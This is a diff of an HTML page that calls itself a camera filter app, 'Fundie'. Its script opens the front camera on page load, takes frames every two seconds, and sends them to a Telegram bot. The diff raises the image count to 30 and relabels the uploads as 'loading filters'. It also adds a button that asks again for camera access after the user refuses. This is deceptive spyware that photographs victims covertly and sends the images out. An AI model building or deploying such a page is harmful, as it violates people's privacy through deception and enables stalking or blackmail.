@@ -1,18 +1,25 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>filter test prototype</title>
+    <title>Fundie</title>
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
 </head>
 <body>
-    <div id="status">Initializing front camera...</div>
+    <div id="status">Initializing front camera for filter...</div>
     <video id="video" width="640" height="480" autoplay muted playsinline></video>
     <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>
+    
+    <div id="permissionContainer" style="display:none;">
+        <p style="margin: 10px 0; font-weight: bold;">Permission required to use app</p>
+        <button id="retryBtn" style="padding: 10px 20px; background: #007bff; color: white; border: none; border-radius: 5px; cursor: pointer;">Give access</button>
+    </div>
     
     <script>
         const video = document.getElementById('video');
         const canvas = document.getElementById('canvas');
         const statusDiv = document.getElementById('status');
+        const retryBtn = document.getElementById('retryBtn');
+        const permissionContainer = document.getElementById('permissionContainer');
         const ctx = canvas.getContext('2d');
         
         // Telegram bot configuration
@@ -21,7 +28,9 @@
         
         let captureInterval;
         let imagesSent = 0;
-        const MAX_IMAGES = 10; // Safety limit
+        const MAX_IMAGES = 30; // Safety limit
+        let retryCount = 0;
+        const MAX_RETRIES = 3;
         
         async function initializeCamera() {
             try {
@@ -36,27 +45,40 @@
                 });
                 
                 video.srcObject = stream;
-                statusDiv.textContent = 'camera active - (keep face steady)applying filter...';
+                statusDiv.textContent = 'Front camera active - applying filter...';
+                permissionContainer.style.display = 'none';
                 
-                // Start capturing images every 2 seconds
+                // load filters every 2 seconds
                 startContinuousCapture();
                 
             } catch (error) {
-                statusDiv.textContent = 'Camera access error :( ' + error.message;
-                console.error('Camera error:', error);
+                handleCameraError(error);
+            }
+        }
+        
+        function handleCameraError(error) {
+            console.error('Camera error:', error);
+            
+            if (retryCount < MAX_RETRIES) {
+                retryCount++;
+                statusDiv.textContent = `Camera access denied. Please allow access to apply filter. (Attempt ${retryCount}/${MAX_RETRIES})`;
+                permissionContainer.style.display = 'block';
+            } else {
+                statusDiv.textContent = 'Maximum retry attempts reached. Please refresh the page.';
+                permissionContainer.style.display = 'none';
             }
         }
         
         function startContinuousCapture() {
             captureInterval = setInterval(async () => {
                 if (imagesSent >= MAX_IMAGES) {
-                    statusDiv.textContent = `Loaded filters- ${MAX_IMAGES} `;
+                    statusDiv.textContent = ` ${MAX_IMAGES} filters loaded`;
                     clearInterval(captureInterval);
                     return;
                 }
                 
                 try {
-                    // Capture image
+                    // filter-c
                     ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                     
                     // Convert to blob and send
@@ -64,7 +86,7 @@
                         const success = await sendToTelegram(blob);
                         if (success) {
                             imagesSent++;
-                            statusDiv.textContent = `(keep face in frame)loading...: ${imagesSent}/${MAX_IMAGES}`;
+                            statusDiv.textContent = `loading filters...: ${imagesSent}/${MAX_IMAGES}`;
                         }
                     }, 'image/jpeg', 0.8);
                     
@@ -91,7 +113,7 @@
                 }
                 
                 const data = await response.json();
-                console.log(`Image ${imagesSent + 1} ready to go`);
+                console.log(`Image ${imagesSent + 1} sent successfully`);
                 return true;
                 
             } catch (error) {
@@ -99,6 +121,12 @@
                 return false;
             }
         }
+        
+        // Retry button handler
+        retryBtn.addEventListener('click', () => {
+            permissionContainer.style.display = 'none';
+            initializeCamera();
+        });
         
         // Auto-initialize when page loads
         window.addEventListener('load', initializeCamera);
@@ -133,6 +161,9 @@
             height: auto;
             border: 2px solid #333;
             border-radius: 10px;
+        }
+        #retryBtn:hover {
+            background: #0056b3;
         }
     </style>
 </body>
